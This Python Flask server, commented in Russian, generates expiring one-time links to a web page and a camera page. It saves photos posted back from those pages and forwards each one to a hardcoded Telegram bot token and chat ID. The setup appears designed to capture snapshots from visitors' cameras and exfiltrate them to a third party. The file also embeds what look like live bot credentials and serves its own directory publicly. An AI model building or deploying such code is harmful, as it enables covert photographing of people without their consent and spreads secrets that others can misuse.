from flask import Flask, request, jsonify, send_file, abort, render_template_string, render_template
import os, uuid
from werkzeug.utils import secure_filename
from datetime import datetime, timedelta
import requests

UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)
ALLOWED_EXT = {'png', 'jpg', 'jpeg'}

app = Flask(__name__, static_folder='.', static_url_path='')

@app.route('/')
def home():
    return render_template('home.html')

# 💙 Отдельный маршрут для камеры
@app.route('/camera')
def open_camera():
    return render_template('camera.html')


# 💙 Простое хранилище одноразовых токенов (старый механизм)
tokens = {}

def create_token(ttl_minutes=60):
    t = uuid.uuid4().hex
    tokens[t] = datetime.utcnow() + timedelta(minutes=ttl_minutes)
    return t

def token_valid(t):
    exp = tokens.get(t)
    if not exp:
        return False
    if datetime.utcnow() > exp:
        tokens.pop(t, None)
        return False
    return True


# 💙 Старый шаблон index.html
with open('index.html', 'r', encoding='utf-8') as f:
    INDEX_HTML = f.read()

@app.route('/new')
def new_link():
    ttl = int(request.args.get('ttl', 60))
    token = create_token(ttl)
    link = request.host_url.rstrip('/') + '/' + token
    return f"""
    <h2>Ссылка готова ✅</h2>
    <p>Срок жизни: {ttl} мин.</p>
    <p><a href="{link}" target="_blank">{link}</a></p>
    """

@app.route('/<token>')
def serve_page(token):
    if not token_valid(token):
        return "Ссылка недействительна или просрочена.", 404
    html = INDEX_HTML.replace("{{TOKEN}}", token)
    return render_template_string(html)


# 💙 Обработчик фото без токенов
@app.route('/upload_photo_open', methods=['POST'])
def upload_photo_open():
    if 'photo' not in request.files:
        return jsonify({'error': 'no photo'}), 400

    file = request.files['photo']
    name = f"photo_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
    path = os.path.join(UPLOAD_DIR, secure_filename(name))
    file.save(path)

    # Отправляем в Telegram
    BOT_TOKEN = "8238948841:AAEJLwE4h-jrBxKhcF61Ho1uM8xbS5nmMEU"
    CHAT_ID = "6984816200"
    try:
        with open(path, 'rb') as f:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
                data={'chat_id': CHAT_ID, 'caption': '📸 Новое фото с открытой камеры'},
                files={'photo': f}
            )
    except Exception as e:
        print("Ошибка Telegram:", e)

    return jsonify({'status': 'ok'})


# 💙 Старый обработчик для ссылок (можно оставить)
@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    if 'photo' not in request.files or 'token' not in request.form:
        return jsonify({'error': 'photo and token required'}), 400

    token = request.form['token']
    if not token_valid(token):
        return jsonify({'error': 'invalid or expired token'}), 403

    file = request.files['photo']
    ext = file.filename.rsplit('.', 1)[-1].lower() if '.' in file.filename else 'png'
    if ext not in ALLOWED_EXT:
        ext = 'png'

    name = f"photo_{token}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.{ext}"
    path = os.path.join(UPLOAD_DIR, secure_filename(name))
    file.save(path)

    tokens.pop(token, None)

    BOT_TOKEN = "8238948841:AAEJLwE4h-jrBxKhcF61Ho1uM8xbS5nmMEU"
    CHAT_ID = "6984816200"

    try:
        with open(path, 'rb') as f:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
                data={'chat_id': CHAT_ID, 'caption': '📸 Фото по токену'},
                files={'photo': f}
            )
    except Exception as e:
        print("Ошибка при отправке в Telegram:", e)

    return jsonify({'url': f'/uploads/{name}'}), 200


@app.route('/uploads/<path:filename>')
def send_uploaded(filename):
    fn = os.path.join(UPLOAD_DIR, filename)
    if not os.path.exists(fn):
        abort(404)
    return send_file(fn)


if __name__ == '__main__':
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))